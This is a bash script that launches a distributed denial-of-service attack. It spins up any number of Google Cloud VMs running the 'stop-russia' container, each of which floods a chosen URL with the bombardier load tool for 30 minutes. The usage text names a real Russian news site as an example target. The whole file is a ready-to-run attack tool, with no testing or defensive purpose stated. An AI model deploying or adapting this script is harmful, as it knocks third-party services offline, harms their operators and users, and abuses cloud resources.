#!/usr/bin/env bash

shopt -s globstar

# Ensure that the CWD is set to script's location
cd "${0%/*}"
CWD=$(pwd)

#######

COUNT=1
TARGET=""

TAG="stop-ru"
TIMESTAMP=$(date +%s)

usage() {
	echo "Usage: $0 [-n <COUNT> -t <TARGET-URL>]" 1>&2
	echo ""
	
	printf "\tExample: $0 -n 2 -t https://interfax.ru\n" 1>&2
	printf "\tExample: $0 -n 3\n" 1>&2
	
	exit 1
}

while getopts "n:t:" o
do
	case "${o}" in
		n)
			COUNT=${OPTARG}
			;;
		t)
			TARGET=${OPTARG}
			;;
		*)
			usage
			;;
	esac
done
shift $((OPTIND-1))

for i in $(seq 1 $COUNT)
do
	EXTRA_ARGS=""
	if [ ! -z "$TARGET" ]
	then
		EXTRA_ARGS=" \
			--container-command=/gopath/bin/bombardier \
			--container-arg=-d \
			--container-arg=1800s \
			--container-arg=$TARGET"
	fi
	
	gcloud compute instances create-with-container \
		$TAG-$TIMESTAMP-$i \
		--zone=asia-northeast3-a \
		--machine-type=f1-micro \
		--network-interface=network-tier=PREMIUM,subnet=default \
		--maintenance-policy=MIGRATE \
		--scopes=https://www.googleapis.com/auth/devstorage.read_only,https://www.googleapis.com/auth/logging.write,https://www.googleapis.com/auth/monitoring.write,https://www.googleapis.com/auth/servicecontrol,https://www.googleapis.com/auth/service.management.readonly,https://www.googleapis.com/auth/trace.append \
		--image=projects/cos-cloud/global/images/cos-85-13310-1416-5 \
		--boot-disk-size=10GB \
		--boot-disk-type=pd-standard \
		--boot-disk-device-name=$TAG-$TIMESTAMP-$i \
		--container-image=abagayev/stop-russia \
		--container-restart-policy=always \
		--container-privileged \
		--container-stdin \
		--container-tty \
		--no-shielded-secure-boot \
		--shielded-vtpm \
		--shielded-integrity-monitoring \
		--labels=container-vm=cos-85-13310-1416-5 \
		-q \
		$EXTRA_ARGS

	echo "Created $TAG-$TIMESTAMP-$i"
done

echo "Done!"
